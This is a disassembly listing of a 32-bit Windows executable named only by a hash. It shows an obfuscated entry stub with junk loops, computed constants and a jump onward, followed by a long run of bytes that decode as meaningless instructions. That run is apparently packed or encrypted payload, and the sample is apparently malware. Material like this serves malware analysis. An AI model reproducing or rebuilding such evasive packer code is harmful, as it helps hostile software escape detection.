
814ffb9b908c363b8d56ebff298696b8e40f565d2c54d29983817034e18aabf0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c16
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d22
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x423822
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238e9
  4012ea:	push   0x42396d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	in     al,0x18
  40143f:	(bad)  
  401440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	adc    ah,al
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   ebx,eax
  401504:	rol    dh,1
  401506:	push   ebp
  401507:	sbb    BYTE PTR [eax],ah
  401509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40150a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40150b:	and    DWORD PTR [eax+0x70006691],esi
  401511:	push   esp
  401512:	shr    DWORD PTR [ecx+0x3c],1
  401515:	sbb    al,0x1
  401517:	ret    0x42d8
  40151a:	rol    DWORD PTR [edi+ebx*8+0x4f],0xd6
  40151f:	pop    ebp
  401520:	mov    ebx,0x46c3d180
  401525:	out    dx,al
  401526:	loope  0x401595
  401528:	cmp    al,0xde
  40152a:	outs   dx,BYTE PTR ds:[esi]
  40152b:	inc    ebp
  40152c:	repz xchg edx,eax
  40152e:	mov    dh,0xe2
  401530:	imul   esi,DWORD PTR ss:[ebp+0x71bf7db2],0x46
  401538:	nop
  401539:	outs   dx,DWORD PTR ds:[esi]
  40153a:	xlat   BYTE PTR ds:[ebx]
  40153b:	dec    edx
  40153c:	mov    ds:0x1227d67e,eax
  401541:	ficom  DWORD PTR [edi+0x1f]
  401544:	sub    al,0x44
  401546:	cmp    eax,0xdd6b461d
  40154b:	das    
  40154c:	lahf   
  40154d:	inc    eax
  40154e:	sub    DWORD PTR fs:[ebx+0x7d65c1e9],0x73
  401556:	call   0x7e7e:0x8769055a
  40155d:	sub    BYTE PTR [ebx+0x4600fbb3],ch
  401563:	cmc    
  401564:	dec    ecx
  401565:	xchg   ecx,eax
  401566:	fisttp QWORD PTR [esi-0x67340280]
  40156c:	js     0x401549
  40156e:	sti    
  40156f:	jo     0x401522
  401571:	es lock jecxz 0x40153b
  401575:	push   0xebf65767
  40157a:	cdq    
  40157b:	nop
  40157c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40157d:	stos   DWORD PTR es:[edi],eax
  40157e:	jne    0x40157b
  401580:	ret    
  401581:	pxor   mm4,mm0
  401584:	xlat   BYTE PTR ds:[ebx]
  401585:	rcr    BYTE PTR [edi-0x91df75a],cl
  40158b:	sub    ebp,ebx
  40158d:	push   edi
  40158e:	rol    al,cl
  401590:	mov    eax,0xf7ff9585
  401595:	ficom  DWORD PTR [ecx+0x64]
  401598:	xor    esi,eax
  40159a:	dec    ebp
  40159b:	inc    esp
  40159c:	sub    esp,eax
  40159e:	cmp    BYTE PTR [ebp-0x2e],ah
  4015a1:	or     bl,0x82
  4015a4:	jle    0x4015cb
  4015a6:	mov    edi,0xe05ea38d
  4015ab:	cld    
  4015ac:	data16 sub BYTE PTR [ecx*1-0x65e50026],bl
  4015b4:	add    eax,0x3282803e
  4015b9:	lock jecxz 0x4015e3
  4015bc:	hlt    
  4015bd:	dec    eax
  4015be:	and    bl,bl
  4015c0:	xchg   edx,eax
  4015c1:	add    edx,ebx
  4015c3:	sub    al,0x7e
  4015c5:	rol    ah,1
  4015c7:	in     eax,dx
  4015c8:	cwde   
  4015c9:	pop    es
  4015ca:	add    edx,DWORD PTR [esi]
  4015cc:	ds lock in eax,dx
  4015cf:	sbb    edi,DWORD PTR [eax]
  4015d1:	cs xchg al,bh
  4015d4:	(bad)  
  4015d5:	in     eax,dx
  4015d6:	fldenv ds:0xfc6b5a66
  4015dc:	mov    edi,0x40399672
  4015e1:	mov    esi,0x3218985b
  4015e6:	dec    ebx
  4015e7:	inc    esp
  4015e8:	pop    eax
  4015e9:	or     esi,DWORD PTR [esi]
  4015eb:	push   ds
  4015ec:	push   0x379fc3cb
  4015f1:	sub    DWORD PTR [ebx],ecx
  4015f3:	cmp    DWORD PTR [ebx-0x45135ee7],0x444792bc
  4015fd:	mov    edi,0x37b29547
  401602:	mov    edx,0xf9674ba3
  401607:	stos   DWORD PTR es:[edi],eax
  401608:	pop    esi
  401609:	rcl    DWORD PTR [esi-0x62465774],1
  40160f:	fist   WORD PTR [eax+0x77]
  401612:	call   0x5806:0xe3a252bb
  401619:	stos   DWORD PTR es:[edi],eax
  40161a:	xchg   ebx,eax
  40161c:	int    0xf9
  40161e:	nop
  40161f:	int    0x29
  401621:	adc    BYTE PTR [edx],al
  401623:	xor    al,al
  401625:	or     BYTE PTR [esi-0x1b],0x44
  401629:	add    al,0x78
  40162b:	xchg   edx,eax
  40162c:	pop    edi
  40162d:	xchg   bl,dl
  40162f:	sahf   
  401630:	test   esi,edi
  401632:	dec    esp
  401633:	icebp  
  401634:	mov    esi,DWORD PTR [eax]
  401636:	or     esp,edx
  401638:	pslld  mm7,QWORD PTR [esi-0x5f]
  40163c:	xchg   edi,eax
  40163d:	(bad)  
  40163f:	not    BYTE PTR [esi]
  401641:	push   edi
  401642:	loop   0x4015fe
  401644:	mov    ?,ebx
  401646:	mov    ebp,0xf6039775
  40164b:	sub    eax,0xdd73b532
  401650:	inc    ebp
  401651:	mov    bh,BYTE PTR [esi]
  401653:	adc    dh,BYTE PTR [ebx]
  401655:	ins    BYTE PTR es:[edi],dx
  401656:	xchg   BYTE PTR [eax],dl
  401658:	icebp  
  401659:	mov    dh,0x87
  40165b:	sbb    DWORD PTR [edx+0x4b],ebx
  40165e:	pop    eax
  40165f:	mov    dh,0xb5
  401661:	jnp    0x401620
  401663:	sub    al,0x27
  401665:	inc    ebx
  401666:	ins    DWORD PTR es:[edi],dx
  401667:	(bad)  
  401669:	ja     0x40167c
  40166b:	pop    ds
  40166c:	or     eax,ebp
  40166e:	enter  0x18f0,0x72
  401672:	push   esp
  401673:	and    edx,ebp
  401675:	or     ah,BYTE PTR [edi+0x2d]
  401678:	pop    es
  401679:	ins    DWORD PTR es:[edi],dx
  40167a:	xchg   edi,eax
  40167b:	pop    ebp
  40167c:	and    BYTE PTR [edi+0x74f2bd61],bh
  401682:	mov    bh,0xcd
  401684:	inc    ebp
  401685:	mov    eax,0x2cea09b5
  40168a:	adc    cl,BYTE PTR [ecx]
  40168c:	rol    esp,0xd3
  40168f:	jb     0x4016a6
  401691:	and    ah,dh
  401693:	mov    ss,esi
  401695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401696:	cmp    cl,ch
  401698:	or     al,0x44
  40169a:	pop    esi
  40169b:	imul   edx,DWORD PTR [ebx+0x68c7638c],0xf37ceee9
  4016a5:	call   0xb458:0xca7ad4bd
  4016ac:	and    DWORD PTR [ebx-0x19],esp
  4016af:	xchg   ebp,eax
  4016b0:	jne    0x40172d
  4016b2:	(bad)  
  4016b3:	adc    esi,esp
  4016b5:	ins    BYTE PTR es:[edi],dx
  4016b6:	ja     0x4016e0
  4016b8:	aad    0xe8
  4016ba:	test   eax,0x6c438ac9
  4016bf:	fnstcw WORD PTR gs:[eax]
  4016c2:	test   BYTE PTR [edi-0x5618728e],ch
  4016c8:	mov    bl,0x3d
  4016ca:	into   
  4016cb:	xlat   BYTE PTR ds:[ebx]
  4016cc:	add    eax,0xd9d7fbf5
  4016d1:	pop    eax
  4016d2:	push   0x34
  4016d4:	pop    ds
  4016d5:	or     dh,al
  4016d7:	loopne 0x4016a8
  4016d9:	(bad)  
  4016da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016db:	adc    dh,dh
  4016dd:	push   ecx
  4016de:	mov    dh,bh
  4016e0:	mov    bh,0xc
  4016e2:	mov    bh,0xbd
  4016e4:	sbb    BYTE PTR [ebx],dl
  4016e6:	das    
  4016e7:	jo     0x4016e5
  4016e9:	shr    DWORD PTR [eax*1-0x697ec1bc],cl
  4016f0:	adc    al,0x5
  4016f2:	iret   
  4016f3:	loope  0x40173b
  4016f5:	fsubr  QWORD PTR [ebp-0x7b]
  4016f8:	nop
  4016f9:	sbb    bh,BYTE PTR [ecx]
  4016fb:	dec    esp
  4016fc:	(bad)  
  4016fd:	ds ret 
  4016ff:	mov    cl,0x77
  401701:	neg    DWORD PTR [esi+ecx*4-0x74]
  401705:	mov    al,ds:0x7f4b21b5
  40170a:	mov    ecx,0x9a93d7f5
  40170f:	mov    ecx,ebx
  401711:	jle    0x4016f5
  401713:	rcr    DWORD PTR [eax],1
  401715:	sar    esp,0x8b
  401718:	pop    esp
  40171a:	add    ebp,DWORD PTR [esi]
  40171c:	pop    es
  40171d:	int    0x88
  40171f:	push   sp
  401721:	pop    ebp
  401722:	jg     0x4016ee
  401724:	stos   BYTE PTR es:[edi],al
  401725:	or     edx,DWORD PTR [eax-0x1875f8cf]
  40172b:	(bad)  
  40172c:	pop    edi
  40172d:	rep outs dx,DWORD PTR ds:[esi]
  40172f:	fcmovnbe st,st(6)
  401731:	dec    ecx
  401732:	pop    edi
  401733:	sbb    eax,0xb9f6f713
  401738:	das    
  401739:	shr    BYTE PTR [edx+0x3cca0d9d],cl
  40173f:	lods   al,BYTE PTR ds:[esi]
  401740:	imul   ebx,DWORD PTR [esi],0xa0d69807
  401746:	shl    edi,cl
  401748:	inc    ebp
  401749:	stos   DWORD PTR es:[edi],eax
  40174a:	fld    DWORD PTR [ecx+0x5da23bb9]
  401750:	(bad)  [ebx-0x50]
  401753:	mov    ds:0x1ae87e88,al
  401758:	add    dl,BYTE PTR [ebx+0x38]
  40175b:	fstp   DWORD PTR [ebp+0x7f]
  40175e:	pusha  
  40175f:	push   ebx
  401760:	sbb    eax,0xf542417a
  401765:	push   edi
  401766:	fidiv  WORD PTR [esi]
  401768:	inc    esp
  401769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40176a:	out    0x12,eax
  40176c:	pop    ds
  40176d:	(bad)  
  40176e:	test   eax,0xe20c9638
  401773:	shl    ebp,0x7c
  401776:	jne    0x40175c
  401778:	or     eax,0x97cce13d
  40177d:	cmp    eax,0x2a3b8ed
  401782:	cli    
  401783:	loope  0x4017f3
  401785:	jnp    0x4017f0
  401787:	jge    0x4017fa
  401789:	sub    bh,BYTE PTR [edx]
  40178b:	push   esi
  40178c:	enter  0xef3b,0xd7
  401790:	(bad)  
  401791:	jmp    0x401781
  401793:	int3   
  401794:	scas   eax,DWORD PTR es:[edi]
  401795:	jnp    0x401812
  401797:	out    0x55,eax
  401799:	xlat   BYTE PTR ds:[ebx]
  40179a:	jp     0x4017b0
  40179c:	push   ebp
  40179d:	pop    edi
  40179e:	lahf   
  40179f:	or     ebp,0x19f9fcd2
  4017a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a6:	out    dx,eax
  4017a7:	int3   
  4017a8:	(bad)  
  4017aa:	adc    eax,0x7a7f0ee8
  4017af:	retf   0xf7b5
  4017b2:	ss mov edx,0x5e2a38f3
  4017b8:	jne    0x401826
  4017ba:	data16 xor cl,bh
  4017bd:	pop    es
  4017be:	fwait
  4017bf:	pop    es
  4017c0:	and    al,0x97
  4017c2:	gs mov edi,0x7e90b30b
  4017c8:	ret    
  4017c9:	sti    
  4017ca:	data16 scas al,BYTE PTR es:[edi]
  4017cc:	push   eax
  4017cd:	sti    
  4017ce:	mov    dl,0xb0
  4017d0:	test   BYTE PTR [edi-0xa],0x10
  4017d4:	mov    esp,0xde262ffe
  4017d9:	sbb    al,al
  4017db:	shl    BYTE PTR [edi],1
  4017dd:	push   0xad6c5279
  4017e2:	push   esi
  4017e3:	retf   
  4017e4:	mov    esp,0x1afd9c8
  4017e9:	pop    ebx
  4017ea:	push   0xffffff8b
  4017ec:	mov    es,WORD PTR ds:0x7e2bd37a
  4017f2:	inc    esi
  4017f3:	scas   eax,DWORD PTR es:[edi]
  4017f4:	add    esi,DWORD PTR ds:0x52ea87d2
  4017fa:	pop    es
  4017fb:	shl    cl,0x1b
  4017fe:	jno    0x4017c9
  401800:	cmp    BYTE PTR [ebx+0x38],bl
  401803:	rcr    DWORD PTR [eax+0x4e],1
  401806:	mov    dh,0x32
  401808:	inc    edi
  401809:	clc    
  40180a:	lods   eax,DWORD PTR ds:[esi]
  40180b:	inc    BYTE PTR [ebp-0x77]
  40180e:	stc    
  40180f:	push   es
  401810:	enter  0xbd62,0xd
  401814:	jle    0x40185c
  401816:	mov    edi,0x86845fb2
  40181b:	pop    eax
  40181c:	arpl   WORD PTR [edi-0x7d120c9f],sp
  401822:	into   
  401823:	mov    edi,0x343af8ed
  401828:	popf   
  401829:	adc    ecx,0xffffffbd
  40182c:	sbb    al,0xe3
  40182e:	xchg   DWORD PTR [esi-0x21],esp
  401831:	nop    esi
  401834:	pop    ss
  401835:	cmp    BYTE PTR [ebx+0x11337a1f],bh
  40183b:	xchg   ecx,eax
  40183c:	pop    edi
  40183d:	jne    0x4017c8
  40183f:	dec    ecx
  401840:	fsubr  DWORD PTR [edi+0x59]
  401843:	rcl    BYTE PTR [edi+ebp*1-0x529c2655],0x6f
  40184b:	push   0x6b
  40184d:	fwait
  40184e:	aaa    
  40184f:	repnz mov ebp,0xdc90a7a0
  401855:	je     0x401853
  401857:	in     al,dx
  401858:	jl     0x401863
  40185a:	retf   0x9514
  40185d:	and    ch,BYTE PTR [edx-0x55]
  401860:	mov    ds:0xfec1507e,al
  401865:	xor    bh,BYTE PTR [edi-0x5ad08906]
  40186b:	sbb    al,0x2e
  40186d:	push   ebx
  40186e:	les    esp,FWORD PTR [ebp-0x172ff553]
  401874:	test   eax,0xc726c666
  401879:	cmp    ch,BYTE PTR [edi+0x4f]
  40187c:	adc    BYTE PTR [ebp+0x6f046391],dh
  401882:	xor    bl,al
  401884:	pop    es
  401885:	(bad)  
  401886:	aam    0xc8
  401888:	sbb    eax,0x3983c593
  40188d:	popa   
  40188e:	dec    esp
  40188f:	loope  0x4018ae
  401891:	repnz (bad)
  401894:	(bad)  
  401895:	cmp    DWORD PTR [edx-0x6b],ecx
  401898:	mov    dh,0x95
  40189a:	xchg   ebp,eax
  40189b:	jo     0x4018b3
  40189d:	cmc    
  40189e:	jno    0x401895
  4018a0:	dec    edi
  4018a1:	inc    edx
  4018a2:	jecxz  0x401916
  4018a4:	lods   al,BYTE PTR ds:[esi]
  4018a5:	and    eax,0x1f53e156
  4018aa:	pxor   mm6,QWORD PTR [ebx]
  4018ad:	daa    
  4018ae:	pop    esi
  4018af:	out    dx,al
  4018b0:	push   edx
  4018b1:	sub    eax,DWORD PTR [edi-0x38]
  4018b4:	sbb    BYTE PTR [ebx+edx*8+0x71],0x38
  4018b9:	aad    0x37
  4018bb:	jo     0x4018d7
  4018bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018be:	bound  eax,QWORD PTR [ebp-0x22]
  4018c1:	jns    0x4018e8
  4018c3:	cmp    eax,0xc7bc2f1
  4018c8:	aaa    
  4018c9:	cmp    edx,ebx
  4018cb:	lods   eax,DWORD PTR ds:[esi]
  4018cc:	jno    0x401855
  4018ce:	les    edx,FWORD PTR [ebx]
  4018d0:	add    ebp,DWORD PTR [eax-0x6a32a851]
  4018d6:	jl     0x40192d
  4018d8:	mov    dl,0xd3
  4018da:	pop    ebx
  4018db:	je     0x401957
  4018dd:	sub    cl,BYTE PTR [edi+eiz*2-0xd]
  4018e1:	mov    DWORD PTR [ebp+ebx*8-0x16],esi
  4018e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018e6:	sbb    ebp,DWORD PTR [eax+esi*8]
  4018e9:	inc    DWORD PTR [esi+ecx*4+0x36]
  4018ed:	fistp  QWORD PTR [esi+0x1245c063]
  4018f3:	adc    ebp,DWORD PTR [eax-0x80]
  4018f6:	stos   DWORD PTR es:[edi],eax
  4018f7:	out    0x82,al
  4018f9:	adc    edx,ebx
  4018fb:	sti    
  4018fc:	fadd   st,st(4)
  4018fe:	jo     0x4018ac
  401900:	inc    edi
  401901:	aad    0x68
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	jnp    0x401946
  401906:	dec    ebp
  401907:	dec    ebp
  401908:	push   ecx
  401909:	push   edi
  40190a:	fsubr  st(3),st
  40190c:	sbb    bl,BYTE PTR [edx+0x36]
  40190f:	cmp    al,0x81
  401911:	jnp    0x4018a6
  401913:	js     0x40191d
  401915:	pop    esp
  401916:	aad    0x3e
  401918:	pop    ecx
